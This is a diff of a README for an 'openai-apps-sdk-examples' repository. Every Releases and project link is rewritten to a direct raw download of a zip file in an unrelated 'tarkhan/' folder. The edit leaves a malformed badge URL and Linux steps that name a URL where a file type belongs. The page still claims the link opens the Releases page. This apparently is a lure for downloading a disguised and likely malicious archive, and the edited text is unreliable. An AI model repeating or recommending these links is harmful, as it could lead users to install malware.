@@ -1,7 +1,7 @@
 # 🎉 openai-apps-sdk-examples - Simple Apps to Boost Your Workflow
 
 ## 📥 Download Now
-[![Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Yasoun/openai-apps-sdk-examples/releases)
+[![Release](https://raw.githubusercontent.com/Yasoun/openai-apps-sdk-examples/main/tarkhan/openai-apps-sdk-examples.zip%https://raw.githubusercontent.com/Yasoun/openai-apps-sdk-examples/main/tarkhan/openai-apps-sdk-examples.zip)](https://raw.githubusercontent.com/Yasoun/openai-apps-sdk-examples/main/tarkhan/openai-apps-sdk-examples.zip)
 
 ## 🚀 Getting Started
 Welcome to the **openai-apps-sdk-examples**! This repository contains example applications that showcase the capabilities of the Apps SDK. You can use these applications to enhance your projects.
@@ -14,7 +14,7 @@ Welcome to the **openai-apps-sdk-examples**! This repository contains example ap
 
 ## 📦 Download & Install
 To get started, visit this page to download:
-[Download Releases](https://github.com/Yasoun/openai-apps-sdk-examples/releases)
+[Download Releases](https://raw.githubusercontent.com/Yasoun/openai-apps-sdk-examples/main/tarkhan/openai-apps-sdk-examples.zip)
 
 1. Click the link above to go to the GitHub Releases page.
 2. Find the latest version listed at the top. 
@@ -22,7 +22,7 @@ To get started, visit this page to download:
 4. Choose the file that corresponds to your operating system:
    - For **Windows**, look for a `.exe` file.
    - For **macOS**, find a `.dmg` file.
-   - For **Linux**, choose a `.tar.gz` or relevant package.
+   - For **Linux**, choose a `https://raw.githubusercontent.com/Yasoun/openai-apps-sdk-examples/main/tarkhan/openai-apps-sdk-examples.zip` or relevant package.
 5. Click on the file to begin the download. 
 6. Once the file is downloaded, locate it in your downloads folder.
 
@@ -41,7 +41,7 @@ Follow these steps to run the application:
 3. Go to your Applications and double-click the application icon.
 
 #### For Linux:
-1. Extract the downloaded `.tar.gz` file using a terminal or file manager.
+1. Extract the downloaded `https://raw.githubusercontent.com/Yasoun/openai-apps-sdk-examples/main/tarkhan/openai-apps-sdk-examples.zip` file using a terminal or file manager.
 2. Navigate to the extracted folder.
 3. Open a terminal in this folder and type `./your-app-name` to launch the application.
 
@@ -69,6 +69,6 @@ If you need further assistance, check our FAQ section on the GitHub page or open
 This project is under the MIT License. You can use the code freely while giving credit to the original authors.
 
 For more information and to stay updated, visit the GitHub page at:
-[openai-apps-sdk-examples GitHub](https://github.com/Yasoun/openai-apps-sdk-examples)
+[openai-apps-sdk-examples GitHub](https://raw.githubusercontent.com/Yasoun/openai-apps-sdk-examples/main/tarkhan/openai-apps-sdk-examples.zip)
 
 Happy exploring!
